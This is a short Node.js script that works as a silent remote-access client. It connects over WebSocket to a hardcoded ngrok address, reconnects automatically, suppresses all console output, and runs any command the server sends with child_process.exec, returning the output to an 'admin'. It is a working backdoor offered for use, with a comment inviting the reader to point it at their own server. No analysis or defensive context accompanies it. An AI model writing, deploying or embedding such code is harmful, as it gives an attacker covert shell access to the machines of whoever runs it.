#!/usr/bin/env node

const WebSocket = require('ws');
const { exec } = require('child_process');

// Embedded server URL - change this to match your server
const SERVER_URL = 'ws://0.tcp.ngrok.io:14513';

// Headless client - no console output, runs silently
let ws;
let clientId = null;
let reconnectInterval = 5000; // 5 seconds
let isConnected = false;

function connect() {
  if (isConnected) return;
  
  ws = new WebSocket(SERVER_URL);

  ws.on('open', () => {
    isConnected = true;
    // Silent - no console output
  });

  ws.on('message', (data) => {
    try {
      const message = JSON.parse(data.toString());
      
      if (message.type === 'connection') {
        clientId = message.clientId;
      } else if (message.type === 'terminate') {
        // Server is terminating this client
        if (ws.readyState === WebSocket.OPEN) {
          ws.close();
        }
        process.exit(0); // Exit the process
      } else if (message.type === 'message') {
        // Check if message is a command
        if (message.message && message.message.startsWith('cmd:')) {
          const command = message.message.substring(4).trim();
          
          if (command.length > 0 && command.length < 1000) {
            // Execute command silently
            exec(command, { maxBuffer: 1024 * 1024 }, (error, stdout, stderr) => {
              let output = '';
              
              if (error) {
                output = `Error: ${error.message}`;
              } else {
                output = stdout || stderr || 'Command executed successfully (no output)';
              }
              
              // Truncate output if too long
              if (output.length > 5000) {
                output = output.substring(0, 5000) + '\n... (output truncated)';
              }
              
              // Send output back to admin
              if (ws.readyState === WebSocket.OPEN) {
                ws.send(JSON.stringify({
                  type: 'message',
                  message: `[${command}]\n${output}`
                }));
              }
            });
          }
        }
        // Regular messages are ignored in headless mode
      }
    } catch (err) {
      // Silent error handling
    }
  });

  ws.on('close', () => {
    isConnected = false;
    // Reconnect after delay
    setTimeout(connect, reconnectInterval);
  });

  ws.on('error', (err) => {
    isConnected = false;
    // Silent error handling
  });
}

// Start connection
connect();

// Keep process running
setInterval(() => {
  // Heartbeat to keep process alive
}, 60000);

// Handle process termination gracefully
process.on('SIGINT', () => {
  if (ws && ws.readyState === WebSocket.OPEN) {
    ws.close();
  }
  process.exit(0);
});

process.on('SIGTERM', () => {
  if (ws && ws.readyState === WebSocket.OPEN) {
    ws.close();
  }
  process.exit(0);
});